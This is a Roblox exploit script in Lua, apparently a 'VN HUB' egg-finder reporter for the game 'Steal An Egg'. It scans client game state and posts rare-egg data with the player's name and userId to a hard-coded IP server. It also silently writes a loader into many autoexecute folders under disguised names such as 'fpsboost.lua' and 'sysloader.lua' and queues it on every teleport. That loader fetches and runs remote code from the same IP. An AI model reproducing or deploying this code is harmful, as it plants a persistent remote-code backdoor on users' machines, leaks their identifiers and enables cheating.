-- =====================================================================
-- [VN HUB] STANDALONE EGG FINDER REPORTER (HEADLESS + AUTO LOAD ON TELEPORT)
-- =====================================================================
task.spawn(function()
	local gEnv = (type(getgenv) == "function" and getgenv()) or _G
	if gEnv.__VNHUB_EGG_REPORTER_RUNNING then
		return
	end
	gEnv.__VNHUB_EGG_REPORTER_RUNNING = true

	if not game:IsLoaded() then
		game.Loaded:Wait()
	end

	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local HttpService = game:GetService("HttpService")
	local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

	-- Tự động nạp lại (Auto-Load) mỗi khi đổi server & tự lưu vào folder Delta (autoexecute / workspace)
	local function setupAutoLoadOnTeleport()
		local bootCode = [[
task.spawn(function()
	if not game:IsLoaded() then game.Loaded:Wait() end
	local urls = {
		"http://160.250.186.192:3489/vnlua.lua",
		"http://160.250.186.192:3489/VNHUB_EggFinder.luau",
	}
	for _, u in ipairs(urls) do
		local ok, src = pcall(function() return game:HttpGet(u, true) end)
		if ok and type(src) == "string" and #src > 100 then
			local fn = loadstring(src)
			if type(fn) == "function" then
				pcall(fn)
				break
			end
		end
	end
end)
]]
		-- Tự lưu vào nhiều folder Delta với 3 tên khác nhau (vnlua.lua, fpsboost.lua, sysloader.lua)
		if type(writefile) == "function" then
			if type(makefolder) == "function" then
				for _, fd in ipairs({ "vnlua", "DeltaCore", "AutoConfig" }) do
					pcall(makefolder, fd)
				end
			end
			local fileNames = { "vnlua.lua", "fpsboost.lua", "sysloader.lua" }
			local baseDirs = {
				"../autoexecute/",
				"../Autoexecute/",
				"../autoexec/",
				"../Autoexec/",
				"../scripts/",
				"../Scripts/",
				"autoexecute/",
				"autoexec/",
				"vnlua/",
				"DeltaCore/",
				"AutoConfig/",
				"",
			}
			for _, dir in ipairs(baseDirs) do
				for _, fn in ipairs(fileNames) do
					pcall(writefile, dir .. fn, bootCode)
				end
			end
		end

		local qot = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
		if type(qot) ~= "function" then
			return
		end
		local function queueNow()
			if gEnv.__VNHUB_EGG_REPORTER_QUEUED then
				return
			end
			local ok = pcall(qot, bootCode)
			if ok then
				gEnv.__VNHUB_EGG_REPORTER_QUEUED = true
			end
		end
		queueNow()
		if LocalPlayer and LocalPlayer.OnTeleport then
			LocalPlayer.OnTeleport:Connect(function()
				queueNow()
			end)
		end
	end
	pcall(setupAutoLoadOnTeleport)

	-- Chỉ kích hoạt quét nếu đúng game Steal An Egg (có module Client.EggState)
	local clientFolder = ReplicatedStorage:WaitForChild("Client", 15)
	local eggStateMod = clientFolder and clientFolder:WaitForChild("EggState", 10)
	if not eggStateMod then
		return
	end

	local okState, EggState = pcall(require, eggStateMod)
	if not okState or type(EggState) ~= "table" then
		return
	end

	local _, Assets = pcall(function() return require(ReplicatedStorage.Data.Assets) end)
	local _, AssetEarnings = pcall(function() return require(ReplicatedStorage.Shared.Util.AssetEarnings) end)
	local okRec, EggRecords = pcall(function() return require(ReplicatedStorage.Shared.Util.EggRecords) end)
	if not (okRec and type(EggRecords) == "table") then
		_, EggRecords = pcall(function() return require(ReplicatedStorage.Shared.Eggs.EggRecords) end)
	end

	local BACKEND_BASES = {
		"http://160.250.186.192:3489",
	}

	local function sendBackend(path, payloadTbl)
		task.spawn(function()
			local okJson, jsonStr = pcall(function()
				return HttpService:JSONEncode(payloadTbl)
			end)
			if not okJson or type(jsonStr) ~= "string" then
				return
			end
			local reqFn = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
			for _, base in ipairs(BACKEND_BASES) do
				local sent = false
				if type(reqFn) == "function" then
					local okReq, res = pcall(reqFn, {
						Url = base .. path,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },
						Body = jsonStr,
					})
					if okReq and type(res) == "table" and (res.StatusCode == 200 or res.StatusCode == 201 or res.Success) then
						sent = true
					end
				end
				if not sent then
					local okEnc, enc = pcall(function()
						return HttpService:UrlEncode(jsonStr)
					end)
					if okEnc and type(enc) == "string" then
						local okGet = pcall(function()
							return game:HttpGet(base .. path .. "?json=" .. enc, true)
						end)
						if okGet then
							sent = true
						end
					end
				end
				if sent then
					break
				end
			end
		end)
	end

	local function formatIcon(val)
		if type(val) == "string" and val ~= "" then
			if val:find("rbxassetid") or val:find("rbxthumb") then
				return val
			elseif val:match("^%d+$") then
				return "rbxassetid://" .. val
			end
		elseif type(val) == "number" and val > 0 then
			return "rbxassetid://" .. tostring(val)
		end
		return ""
	end

	local function resolveEggMeta(cat)
		local dir = type(Assets) == "table" and type(Assets.Directory) == "table" and Assets.Directory[cat] or nil
		if type(dir) ~= "table" then
			return tostring(cat), "Common", "", 18
		end
		local dispName = tostring(dir.DisplayName or dir.Name or dir._id or cat)
		local rarity = "Common"
		if type(dir.Rarity) == "table" then
			rarity = tostring(dir.Rarity.DisplayName or dir.Rarity._id or "Common")
		elseif type(dir.Rarity) == "string" then
			rarity = dir.Rarity
		end
		local icon = ""
		local keys = { "Icon", "Image", "Thumbnail", "ImageId", "IconId" }
		if type(dir.Egg) == "table" then
			for _, k in ipairs(keys) do
				local ic = formatIcon(dir.Egg[k])
				if ic ~= "" then icon = ic; break end
			end
		end
		if icon == "" then
			for _, k in ipairs(keys) do
				local ic = formatIcon(dir[k])
				if ic ~= "" then icon = ic; break end
			end
		end
		local baseWeight = tonumber(dir.BaseWeight or dir.Weight) or 18
		return dispName, rarity, icon, baseWeight
	end

	local trackedUids = {}
	local lastSig = ""
	local lastReportClk = 0

	local function scanAndReport(forcePush)
		local jobId = tostring(game.JobId or "")
		if #jobId < 16 then
			return
		end
		local curPlaying = #Players:GetPlayers()
		local curMax = tonumber(Players.MaxPlayers) or 7
		local currentAlive = {}
		local reportBatch = {}
		local sigParts = { tostring(curPlaying) }

		pcall(function()
			local readFn = EggState.ReadFieldEggs or EggState.GetAreaEggSnapshot
			local snap = type(readFn) == "function" and readFn() or nil
			local records = type(snap) == "table" and snap.Records or {}

			for idx, rec in pairs(records) do
				if type(rec) == "table" and rec.AssetCategory and rec.State ~= "Claimed" and rec.State ~= "Carried" then
					local uidStr = tostring(rec.Uid or idx)
					if uidStr:sub(1, 12) ~= "FirstAreaEgg" then
						currentAlive[uidStr] = true
						local cat = tostring(rec.AssetCategory)
						local scale = tonumber(rec.AssetScale or rec.Scale) or 1
						local baseName, rar, iconStr, baseW = resolveEggMeta(cat)

						local kg = 0
						if type(EggRecords) == "table" and type(EggRecords.WeightKgForScale) == "function" then
							local okW, wVal = pcall(EggRecords.WeightKgForScale, cat, scale)
							if okW and tonumber(wVal) then
								kg = tonumber(wVal)
							end
						end
						if kg <= 0 then
							kg = tonumber(rec.Weight or rec.Kg) or math.max(0.1, baseW * (scale ^ 2.2))
						end
						kg = math.floor(kg * 100 + 0.5) / 100

						local rate = 0
						if type(AssetEarnings) == "table" then
							local calcFn = AssetEarnings.MutationOnlyRatePerSecond or AssetEarnings.LiveRatePerSecond
							if type(calcFn) == "function" then
								local okR, rVal = pcall(calcFn, {
									Category = cat,
									Scale = scale,
									Mutations = rec.Mutations or {},
									BaseMutation = rec.BaseMutation,
									EyeColor = rec.AssetEyeColor,
									ColorSeed = rec.AssetColorSeed,
									ColorIndex = rec.AssetColorIndex,
									Gender = rec.Gender,
									Personality = rec.Personality or "Normal",
									HasBeenFirstPlaced = rec.HasBeenFirstPlaced == true,
								})
								if okR and tonumber(rVal) and tonumber(rVal) > 0 then
									rate = tonumber(rVal)
								end
							end
						end
						if rate <= 0 then
							rate = tonumber(rec.Rate or rec.Value) or 0
						end

						local mutList = {}
						if type(rec.Mutations) == "table" then
							for mk, mv in pairs(rec.Mutations) do
								if mv == true then
									mutList[#mutList + 1] = tostring(mk)
								elseif type(mv) == "string" and mv ~= "" and mv ~= "None" then
									mutList[#mutList + 1] = mv
								end
							end
						elseif type(rec.BaseMutation) == "string" and rec.BaseMutation ~= "" and rec.BaseMutation ~= "None" then
							mutList[#mutList + 1] = rec.BaseMutation
						end
						local mutStr = table.concat(mutList, ", ")
						local dispName = (mutStr ~= "" and ("[" .. mutStr .. "] " .. baseName)) or baseName

						if rate >= 10 or kg >= 10 or rar == "Divine" or rar == "Eternal" or rar == "Secret" or rar == "Admin" or rar == "Cosmic" or rar == "Mythic" then
							trackedUids[uidStr] = 0
							sigParts[#sigParts + 1] = uidStr
							reportBatch[#reportBatch + 1] = {
								uid = uidStr,
								name = dispName,
								cat = cat,
								rarity = rar,
								kg = kg,
								rate = rate,
								scale = scale,
								area = tostring(rec.AreaId or "Field"),
								mutation = mutStr,
								icon = iconStr,
								jobId = jobId,
								playing = curPlaying,
								maxPlayers = curMax,
							}
						end
					end
				end
			end
		end)

		local goneUids = {}
		for uidKey in pairs(trackedUids) do
			if not currentAlive[uidKey] then
				trackedUids[uidKey] = nil
				goneUids[#goneUids + 1] = uidKey
			end
		end
		if #goneUids > 0 then
			sendBackend("/finder/gone", {
				jobId = jobId,
				gone = goneUids,
			})
		end

		table.sort(sigParts)
		local newSig = table.concat(sigParts, "|")
		local nowClk = os.clock()
		if #reportBatch > 0 and (forcePush or newSig ~= lastSig or (nowClk - lastReportClk) >= 12) then
			lastSig = newSig
			lastReportClk = nowClk
			sendBackend("/finder/report", {
				sync = true,
				jobId = jobId,
				placeId = game.PlaceId,
				playing = curPlaying,
				maxPlayers = curMax,
				reporter = tostring(LocalPlayer and LocalPlayer.Name or "Player"),
				userId = tostring(LocalPlayer and LocalPlayer.UserId or 0),
				eggs = reportBatch,
			})
		end
	end

	local function bindAreaFolder(folder)
		if not folder then return end
		folder.ChildAdded:Connect(function()
			task.delay(0.5, function() pcall(scanAndReport, true) end)
		end)
		folder.ChildRemoved:Connect(function()
			task.delay(0.3, function() pcall(scanAndReport, true) end)
		end)
	end

	local areaFolder = workspace:FindFirstChild("AreaEggSlotsClient")
	if areaFolder then
		bindAreaFolder(areaFolder)
	else
		local conn
		conn = workspace.ChildAdded:Connect(function(ch)
			if ch.Name == "AreaEggSlotsClient" then
				conn:Disconnect()
				bindAreaFolder(ch)
				pcall(scanAndReport, true)
			end
		end)
	end

	pcall(scanAndReport, true)
	while task.wait(4) do
		pcall(scanAndReport, false)
	end
end)
